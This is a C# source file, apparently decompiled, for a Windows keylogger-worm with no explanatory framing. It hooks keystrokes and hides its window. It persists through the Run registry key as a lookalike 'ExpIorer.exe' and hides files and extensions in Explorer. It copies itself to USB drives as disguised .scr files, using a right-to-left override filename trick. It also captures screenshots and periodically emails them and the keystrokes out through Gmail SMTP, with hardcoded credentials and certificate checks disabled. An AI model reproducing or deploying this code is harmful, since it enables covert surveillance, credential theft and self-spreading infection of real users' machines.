using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Net.Security;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using Microsoft.Win32;

namespace NEW;

internal static class Program
{
	private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

	private const int WH_KEYBOARD_LL = 13;

	private const int WM_KEYDOWN = 256;

	private const int SW_HIDE = 0;

	private static string km = "";

	private static LowLevelKeyboardProc _proc = HookCallback;

	private static IntPtr _hookID = IntPtr.Zero;

	private static string mreg = Path.GetRandomFileName();

	private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
	{
		if (nCode >= 0 && wParam == (IntPtr)256)
		{
			int num = Marshal.ReadInt32(lParam);
			km += (object)(Keys)num;
		}
		return CallNextHookEx(_hookID, nCode, wParam, lParam);
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool UnhookWindowsHookEx(IntPtr hhk);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
	private static extern IntPtr GetModuleHandle(string lpModuleName);

	private static IntPtr SetHook(LowLevelKeyboardProc proc)
	{
		using Process process = Process.GetCurrentProcess();
		using ProcessModule processModule = process.MainModule;
		return SetWindowsHookEx(13, proc, GetModuleHandle(processModule.ModuleName), 0u);
	}

	private static void USBSpread(object sender, EventArgs e)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", writable: true);
			try
			{
				registryKey.DeleteValue(mreg);
			}
			catch
			{
			}
			mreg = Path.GetRandomFileName();
			registryKey.SetValue(mreg, Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ExpIorer.exe"));
			registryKey.Close();
		}
		catch
		{
		}
		try
		{
			using RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Advanced");
			registryKey2.SetValue("Hidden", 0, RegistryValueKind.DWord);
		}
		catch
		{
		}
		try
		{
			using RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Advanced");
			registryKey2.SetValue("HideFileExt", 1, RegistryValueKind.DWord);
		}
		catch
		{
		}
		int num = 0;
		Process[] processes = Process.GetProcesses();
		foreach (Process item2 in processes.Where((Process x) => x.ToString() == "System.Diagnostics.Process (ExpIorer)"))
		{
			_ = item2;
			num = 1;
		}
		if (num == 0)
		{
			try
			{
				Process.Start(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ExpIorer.exe"));
				Process.GetCurrentProcess().Kill();
			}
			catch
			{
			}
		}
		int num2 = 0;
		List<string> list = new List<string>();
		string sourceFileName = Application.get_ExecutablePath().ToString();
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo item3 in drives.Where((DriveInfo x) => x.DriveType.ToString() == "Removable" && x.IsReady))
		{
			string[] directories = Directory.GetDirectories(item3.Name);
			foreach (string item in directories)
			{
				list.Add(item);
			}
			try
			{
				if (list.Count <= 0)
				{
					File.Copy(sourceFileName, string.Concat(item3, "$Recycle.Bin\u202e.scr"));
					break;
				}
			}
			catch
			{
			}
			try
			{
				while (list.Count > 0)
				{
					File.Copy(sourceFileName, list[num2] + ".scr", overwrite: true);
					if (!File.Exists(list[num2] + ".scr"))
					{
						num2++;
						continue;
					}
					File.SetAttributes(list[num2], File.GetAttributes(list[num2]) | FileAttributes.Hidden);
					return;
				}
			}
			catch
			{
			}
		}
	}

	private static void email(object sender, EventArgs e)
	{
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Invalid comparison between Unknown and I4
		//IL_00b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b8: Expected O, but got Unknown
		if (File.Exists("C:\\angel") && (int)MessageBox.Show("Exit?", "", (MessageBoxButtons)4) == 6)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process item2 in processes.Where((Process x) => x.ToString() == "System.Diagnostics.Process (ExpIorer.exe)"))
			{
				item2.Kill();
			}
			Process.GetCurrentProcess().Kill();
		}
		Bitmap val = new Bitmap(Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height);
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		try
		{
			val2.CopyFromScreen(0, 0, 0, 0, ((Image)val).get_Size());
		}
		finally
		{
			((IDisposable)val2)?.Dispose();
		}
		if (File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Wall")))
		{
			File.Delete(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Wall"));
		}
		((Image)val).Save(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Wall"));
		MailMessage mailMessage = new MailMessage();
		mailMessage.To.Add("zibayekhofte_lover2006@yahoo.com");
		mailMessage.From = new MailAddress("XtahmineX@gmail.com", "XtahmineX", Encoding.UTF8);
		mailMessage.Subject = "";
		mailMessage.SubjectEncoding = Encoding.UTF8;
		mailMessage.Body = km;
		mailMessage.BodyEncoding = Encoding.UTF8;
		mailMessage.IsBodyHtml = false;
		mailMessage.Priority = MailPriority.High;
		SmtpClient smtpClient = new SmtpClient();
		smtpClient.Credentials = new NetworkCredential("XtahmineX@gmail.com", "morteza20");
		smtpClient.Port = 587;
		smtpClient.Host = "smtp.gmail.com";
		smtpClient.EnableSsl = true;
		Attachment item = new Attachment(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Wall"));
		mailMessage.Attachments.Add(item);
		ServicePointManager.ServerCertificateValidationCallback = (object s, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors) => true;
		try
		{
			smtpClient.Send(mailMessage);
			km = "";
		}
		catch
		{
			Application.Restart();
		}
	}

	private static void Main()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Templates);
		bool createdNew;
		Mutex mutex = new Mutex(initiallyOwned: true, Application.get_ProductName(), out createdNew);
		if (createdNew)
		{
			mutex.ReleaseMutex();
		}
		else
		{
			if (Application.get_StartupPath().Length < 4)
			{
				Process.Start("Explorer", Application.get_ExecutablePath().Substring(0, Application.get_ExecutablePath().Length - 4));
			}
			Process.GetCurrentProcess().Kill();
		}
		try
		{
			File.Copy(Application.get_ExecutablePath().ToString(), folderPath, overwrite: true);
		}
		catch
		{
		}
		folderPath = Path.Combine(folderPath, "Service.exe");
		if (Application.get_StartupPath().Length < 4)
		{
			Process.Start("Explorer", Application.get_ExecutablePath().Substring(0, Application.get_ExecutablePath().Length - 4));
			if (File.Exists(Application.get_StartupPath() + "private(my film, my music,birthday,khososi,arooosi,my picture,exe file.dlll.jpeg.jpg.exe"))
			{
				Process.Start(Application.get_StartupPath() + "private(my film, my music,birthday,khososi,arooosi,my picture,exe file.dlll.jpeg.jpg.exe");
			}
		}
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", writable: true);
			string[] valueNames = registryKey.GetValueNames();
			foreach (string name in valueNames)
			{
				if (registryKey.GetValue(name)!.ToString() == folderPath)
				{
					mreg = name;
				}
			}
		}
		catch
		{
		}
		USBSpread(null, null);
		IntPtr consoleWindow = GetConsoleWindow();
		ShowWindow(consoleWindow, 0);
		_hookID = SetHook(_proc);
		Application.Run();
		UnhookWindowsHookEx(_hookID);
		System.Timers.Timer timer = new System.Timers.Timer();
		timer.Elapsed += email;
		timer.AutoReset = true;
		timer.Interval = 720000.0;
		timer.Start();
		System.Timers.Timer timer2 = new System.Timers.Timer();
		timer2.Elapsed += USBSpread;
		timer2.AutoReset = true;
		timer2.Interval = 4000.0;
		timer2.Start();
	}
}
